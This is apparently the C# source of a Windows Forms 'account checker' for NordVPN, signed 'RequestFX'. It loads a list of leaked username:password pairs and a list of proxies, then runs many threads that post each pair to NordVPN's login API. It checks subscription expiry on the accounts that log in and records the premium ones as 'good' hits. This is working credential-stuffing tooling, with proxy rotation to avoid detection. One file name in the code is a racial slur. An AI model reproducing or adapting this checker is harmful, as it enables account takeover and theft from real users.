using Leaf.xNet;
using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Threading;
using System.Windows.Forms;

namespace Checker_by_RequestFX
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
            Threadnum.Text = "50";
            this.SetStyle(ControlStyles.ResizeRedraw, true);
        }

        private const int cGrip = 16;
        private const int cCaption = 32;

        protected override void WndProc(ref Message m)
        {
            if (m.Msg == 0x84)
            {
                Point pos = new Point(m.LParam.ToInt32());
                pos = this.PointToClient(pos);
                if (pos.Y < cCaption)
                {
                    m.Result = (IntPtr)2;
                    return;
                }
                if (pos.X >= this.ClientSize.Width - cGrip && pos.Y >= this.ClientSize.Height - cGrip)
                {
                    m.Result = (IntPtr)17;
                    return;
                }
            }
            base.WndProc(ref m);
        }

        private void bunifuFlatButton1_Click(object sender, EventArgs e)
        {
            Program.TextFile("combo");
            Combonum.Text = Program.ccount.ToString();
        }

        private void Stop_Click(object sender, EventArgs e)
        {

        }

        private void comboBox1_SelectedIndexChanged(object sender, EventArgs e)
        {
            proxyType.Text = comboBox1.SelectedItem.ToString();
            Program.proxyType = comboBox1.SelectedItem.ToString();
        }

        private void Main_Load(object sender, EventArgs e)
        {

        }

        private void bunifuCustomLabel2_Click(object sender, EventArgs e)
        {

        }

        private void Proxy_Click(object sender, EventArgs e)
        {
            Program.TextFile("proxy");
            Proxynum.Text = Program.pcount.ToString();
        }

        private void bunifuCustomLabel1_Click(object sender, EventArgs e)
        {

        }

        private void bunifuCustomLabel6_Click(object sender, EventArgs e)
        {

        }

        private void textBox1_TextChanged(object sender, EventArgs e)
        {

        }

        private void bunifuSlider1_ValueChanged(object sender, EventArgs e)
        {
            if (Slider.Value == 0)
            {
                Program.thread = 1;
                Threadnum.Text = "1";
            }
            else
            {
                Program.thread = Slider.Value;
                Threadnum.Text = Slider.Value.ToString();
            }
        }

        private void Threadnum_Click(object sender, EventArgs e)
        {

        }

        private void bunifuImageButton1_Click_1(object sender, EventArgs e)
        {
            this.WindowState = FormWindowState.Minimized;
        }
        private void Coder_Click(object sender, EventArgs e)
        {
            if (Program.running == false)
            {
                Rainbowcycle.Start();
                Program.running = true;
            }
            else if (Program.running == true)
            {
                Rainbowcycle.Stop();
                Program.running = false;
            }
        }
        private void Rainbowcycle_Tick(object sender, EventArgs e)
        {
            RequestFX.ForeColor = Program.Rainbow(Program.f);
            Program.f += 0.01f;
            if (Program.f >= 1f) Program.f = 0f;
        }

        private void Start_Click(object sender, EventArgs e)
        {
            if (Program.ccount == 0 || Program.pcount == 0)
            {
                MessageBox.Show("Select Combo / Proxy");
            }
            else
            {
                Timer.Start();
                for (int i = 1; i <= Program.thread; ++i)
                    new Thread(new ThreadStart(Check)).Start();
            }
        }

        private void Type_Click(object sender, EventArgs e)
        {

        }

        private void List_CellContentClick(object sender, DataGridViewCellEventArgs e)
        {

        }

        private void close_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }

        private void minimize_Click(object sender, EventArgs e)
        {
            this.WindowState = FormWindowState.Minimized;
        }

        private void pictureBox1_Click(object sender, EventArgs e)
        {
            pictureBox1.Visible = false;
            pictureBox2.Visible = true;
        }

        private void bunifuCustomLabel14_Click(object sender, EventArgs e)
        {

        }

        private void bunifuFlatButton1_Click_1(object sender, EventArgs e)
        {
            Application.Exit();
        }

        public void Check()
        {
            while (true)
            {
                if (Program.proxynumber > Program.proxyList.Count<string>() - 2)
                    Program.proxynumber = 0;
                try
                {
                    Interlocked.Increment(ref Program.proxynumber);
                    using (HttpRequest httpRequest = new HttpRequest())
                    {
                        if (Program.combonumber >= Program.comboList.Count<string>())
                        {
                            break;
                        }
                        Interlocked.Increment(ref Program.combonumber);
                        Program.AccountDetails = Program.comboList[Program.combonumber].Split(':');
                        try
                        {
                            httpRequest.IgnoreProtocolErrors = true;
                            httpRequest.KeepAlive = true;
                            if (Program.proxyType == "HTTP")
                                httpRequest.Proxy = (ProxyClient)HttpProxyClient.Parse(Program.proxyList[Program.proxynumber]);
                            if (Program.proxyType == "SOCKS4")
                                httpRequest.Proxy = (ProxyClient)Socks4ProxyClient.Parse(Program.proxyList[Program.proxynumber]);
                            if (Program.proxyType == "SOCKS5")
                                httpRequest.Proxy = (ProxyClient)Socks5ProxyClient.Parse(Program.proxyList[Program.proxynumber]);
                            httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36");
                            httpRequest.AddHeader("Accept", "*/*");
                            string data = httpRequest.Post("https://api.nordvpn.com/v1/users/tokens", "{\"username\":\"" + Program.AccountDetails[0] + "\",\"password\":\"" + Program.AccountDetails[1] + "\"}", "application/json").ToString();
                            if (data.Contains("user_id\":"))
                            {
                                string str2 = Program.Base64Encode("token:" + Utils.LRParse(data, "token\":\"", "\"", false, false));
                                httpRequest.AddHeader("Authorization", "Basic " + str2);
                                if (DateTime.Compare(Convert.ToDateTime(DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss")), Convert.ToDateTime(Utils.LRParse(httpRequest.Get("https://api.nordvpn.com/v1/users/services", (RequestParams)null).ToString(), "expires_at\":\"", "\"", false, false))) < 0)
                                {
                                    ++Program.check;
                                    ++Program.good;
                                    //Program.hitCombos = Program.hitCombos + str1 + "\n";
                                }
                                else
                                {
                                    ++Program.check;
                                    ++Program.bad;
                                }
                            }
                            else if (data.Contains("code\":101301"))
                            {
                                ++Program.check;
                                ++Program.bad;
                            }
                            else if (data.Contains("message\":\"Unauthorized"))
                            {
                                ++Program.check;
                                ++Program.bad;
                            }
                            else
                            {
                                ++Program.error;
                            }
                        }
                        catch (Exception ex)
                        {
                            ++Program.error;
                        }
                    }
                }
                catch (Exception ex)
                {

                }
            }
        }

        private void bunifuCustomLabel5_Click(object sender, EventArgs e)
        {

        }

        private void bunifuCustomLabel4_Click(object sender, EventArgs e)
        {

        }

        private void bunifuCustomLabel12_Click(object sender, EventArgs e)
        {
        }

        private void Combonum_Click(object sender, EventArgs e)
        {

        }

        private void bunifuFlatButton2_Click(object sender, EventArgs e)
        {
            if (Directory.Exists(Program.Date))
            {
                Process.Start(Program.Date);
            }
        }

        private void Timer_Tick(object sender, EventArgs e)
        {
            Good.Text = Program.good.ToString();
            Bad.Text = Program.bad.ToString();
            Checked.Text = Program.check.ToString() + " / " + Program.ccount.ToString();

            if (Program.AccountDetails[0] == null || Program.AccountDetails[1] == null)
            {

            }
            else
            {
                if (!Directory.Exists(Program.Date))
                {
                    Directory.CreateDirectory(Program.Date);
                }
                if (!File.Exists(Program.Date + "\\Premium.txt"))
                {
                    using (StreamWriter sw = File.CreateText(Program.Date + "\\Premium.txt"))
                    {
                        sw.WriteLine("Checker Made By RequestFX\n");

                    }
                }


                AccountList.Rows.Add(new object[]
                    {
                    Program.AccountDetails[0],
                    Program.AccountDetails[1],
                    12

        }
        );
            }
        }

        private void NordVPN_Click(object sender, EventArgs e)
        {
            using (StreamWriter sw = File.CreateText(Program.Date + "nigga.txt"))
            {
                sw.WriteLine("Hello");
                sw.WriteLine("And");
                sw.WriteLine("Welcome");
            }
        }
    }
}